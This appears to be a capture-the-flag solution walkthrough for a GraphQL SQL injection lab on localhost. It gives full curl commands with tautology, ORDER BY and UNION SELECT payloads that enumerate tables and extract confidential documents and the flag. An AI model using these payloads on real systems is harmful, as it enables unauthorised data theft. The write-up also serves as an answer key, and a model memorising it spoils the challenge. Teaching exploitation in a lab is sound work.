# Solution: GraphQL SQL Injection

## Overview

This challenge demonstrates SQL injection vulnerabilities in GraphQL resolvers. The `searchUsers` query constructs SQL queries using string concatenation, allowing attackers to inject malicious SQL and access confidential data.

## Step 1: Reconnaissance

Explore the normal API functionality:

```bash
curl -X POST http://localhost:8007/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { users { id username email role documents { id title confidential } } }"
  }'
```

Notice that `admin_user` has no visible documents, but other users do. This suggests confidential documents are being filtered.

Test the search functionality:

```bash
curl -X POST http://localhost:8007/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { searchUsers(username: \"john\") { id username } }"
  }'
```

## Step 2: Vulnerability Identification

Test for SQL injection in the search parameter:

```bash
curl -X POST http://localhost:8007/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { searchUsers(username: \"test'\'' OR '\''1'\''='\''1'\''--\") { id username } }"}'
```

If this returns all users, the endpoint is vulnerable. The underlying query is:
```sql
SELECT * FROM users WHERE username LIKE '%${username}%'
```

## Step 3: Exploitation

**Step 3a - Determine column count using ORDER BY:**

```bash
curl -X POST http://localhost:8007/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { searchUsers(username: \"test'\'' ORDER BY 4--\") { id username } }"}'
```

If this works but ORDER BY 5 fails, the table has 4 columns.

**Step 3b - Discover tables using UNION:**

```bash
curl -X POST http://localhost:8007/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { searchUsers(username: \"test'\'' UNION SELECT name, type, NULL, NULL FROM sqlite_master WHERE type='\''table'\''--\") { id username } }"}'
```

This reveals the `documents` table.

**Step 3c - Extract confidential documents:**

```bash
curl -X POST http://localhost:8007/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { searchUsers(username: \"test'\'' UNION SELECT debug_info, title, content, confidential FROM documents WHERE confidential = 1--\") { id username email role } }"}'
```

## Step 4: Flag Retrieval

The UNION SELECT injection extracts data from the `documents` table, specifically targeting rows where `confidential = 1`. The `debug_info` column contains the flag, which appears in the `id` field of the search results (due to column mapping in the UNION).

The flag follows the format: `HC{...}`
